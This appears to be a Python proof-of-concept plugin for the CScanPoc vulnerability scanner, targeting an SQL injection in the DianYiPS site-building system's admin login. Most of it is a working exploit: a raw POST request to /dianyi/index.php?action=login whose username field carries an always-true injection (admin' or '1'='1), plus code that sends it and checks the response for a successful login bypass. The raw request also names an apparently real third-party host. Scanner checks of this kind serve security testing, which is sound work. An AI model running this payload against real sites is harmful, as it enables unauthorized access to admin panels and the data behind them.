# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'DianYiPS_0001'  # 平台漏洞编号，留空
    name = 'DianYiPS建站系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-27'  # 漏洞公布时间
    desc = '''
        DianYiPS建站系统 /dianyi/index.php 管理后台，SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=110810'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DianYiPS建站系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


rawt = '''
POST /dianyi/index.php?action=login HTTP/1.1
Host: gxpcjz.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.6.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 94
Cookie: tempConfig=default
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

name=admin'%20or%20'1'%3D'1&password=5646&submit=%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95&isAjax=1
'''


class Poc(ABPoc):
    poc_id = 'fe80cda7-1054-4aaf-913e-ae05ad52373e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # from:http://www.wooyun.org/bugs/wooyun-2015-0110810
            url = self.target
            code, head, res, errcode, _ = hh.http(
                url + '/dianyi/index.php?action=login', raw=rawt)
            if code == 200:
                m = re.search('success', res)
                if m:
                    #security_info('[username: sql injection]'+ url + '/dianyi/index.php?action=login')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
